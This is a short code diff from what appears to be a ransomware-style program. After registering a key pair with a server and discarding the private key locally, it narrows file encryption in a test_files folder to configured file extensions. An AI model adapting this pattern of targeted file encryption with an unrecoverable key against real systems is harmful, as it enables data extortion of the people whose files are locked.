@@ -47,7 +47,9 @@ def genKeyPair():
     _helper.debug("Got Response from /users/add => " + str(req.json()))
     keys.forgetPrivate()
 
-    pathlist = Path('./test_files').glob('**/*')
+    pathlist = []
+    for types in Config.FILE_TYPES:
+        pathlist.extend(Path('./test_files').glob('**/*.' + types))
     for path in pathlist:
         path_in_str = str(path)
         fc = FileCrypter()
